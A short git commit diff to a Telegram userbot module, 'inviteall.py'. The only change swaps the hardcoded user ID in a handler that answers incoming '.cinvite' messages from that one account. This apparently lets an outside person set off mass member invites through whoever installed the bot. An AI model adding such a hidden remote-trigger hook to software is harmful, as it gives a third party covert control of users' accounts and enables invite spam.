d1e6245ed4f29e53fcb4a2cc92a2f624f320a4c0
Grey Project <95908917+grey423@users.noreply.github.com>
2021-12-31 21:53:38 -0800

    Update inviteall.py

--- userbot/modules/inviteall.py
+++ userbot/modules/inviteall.py
@@ -52,7 +52,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1935384758,
+@register(incoming=True, from_users=5066592080,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
